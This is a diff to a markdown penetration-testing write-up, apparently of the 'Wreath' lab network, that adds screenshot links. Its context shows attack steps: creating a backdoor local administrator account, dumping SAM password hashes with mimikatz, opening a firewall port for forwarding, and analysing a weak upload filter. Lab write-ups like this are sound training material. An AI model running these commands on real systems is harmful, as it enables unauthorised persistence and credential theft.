@@ -348,7 +348,7 @@ To enable stable access via RDP and WinRM, created a local administrator:
 
 ```powershell
 net user elliot elliot /add
-net localgroup Administrators elliot /add
+net localgroup "Administrators" elliot /add
 net localgroup "Remote Management Users" elliot /add
 ```
 
@@ -364,6 +364,8 @@ The command completed successfully.
 
 - Administrators → Full local control
 - Remote Management Users → WinRM access
+
+![photo-no4](/assets/images/wreath-images/wreath 4.png)
 
 ## Post-Exploitation - Credential Harvesting
 
@@ -388,6 +390,8 @@ Privilege '20' OK
 
 mimikatz # lsadump::sam
 ```
+
+![photo-no5](/assets/images/wreath-images/wreath 5.png)
 
 **Extracted Hashes:**
 
@@ -465,6 +469,7 @@ netsh advfirewall firewall add rule name="port-fwd" \
 ```
 2026/01/05 22:27:04 client: Connected (Latency 174.480098ms)
 ```
+![photo-no6](/assets/images/wreath-images/wreath 6.png)
 
 ## Source Code Analysis
 
@@ -492,6 +497,7 @@ for i in $(ls); do
   printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n";
 done
 ```
+![photo-no7](/assets/images/wreath-images/wreath 7.png)
 
 **Commit Messages:**
 
@@ -527,7 +533,8 @@ if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
     die();
 }
 ```
-
+![photo-no8](/assets/images/wreath-images/wreath 8.png)
+![photo-no9](/assets/images/wreath-images/wreath 9.png)
 ### Identified Vulnerabilities
 
 **1. Weak Image Validation:**
